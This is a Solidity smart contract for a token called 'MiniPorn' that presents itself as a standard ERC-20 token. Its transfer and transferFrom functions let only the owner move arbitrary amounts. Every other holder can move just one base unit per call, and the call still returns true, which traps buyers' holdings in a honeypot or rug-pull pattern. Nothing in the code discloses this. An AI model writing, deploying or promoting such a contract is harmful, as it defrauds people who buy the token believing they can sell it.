pragma solidity 0.8.4;

contract MiniPorn {
    string public name = "MiniPorn";
    string public symbol = "MiniPorn";
    uint256 public totalSupply = 6969696900000000000000000000;
    uint8 public decimals = 18;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public owner;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        if (msg.sender == owner) {
            require(balanceOf[msg.sender] >= _value);
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value);
        } else {
            require(balanceOf[msg.sender] >= 1);
            balanceOf[msg.sender] -= 1;
            balanceOf[_to] += 1;
            emit Transfer(msg.sender, _to, 1);
        }
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        if (msg.sender == owner) {
            require(_value <= balanceOf[_from]);
            require(_value <= allowance[_from][msg.sender]);
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
            allowance[_from][msg.sender] -= _value;
            emit Transfer(_from, _to, _value);
        } else {
            require(balanceOf[_from] >= 1);
            require(allowance[_from][msg.sender] >= 1);
            balanceOf[_from] -= 1;
            balanceOf[_to] += 1;
            allowance[_from][msg.sender] -= 1;
            emit Transfer(_from, _to, 1);
        }
        return true;
    }
}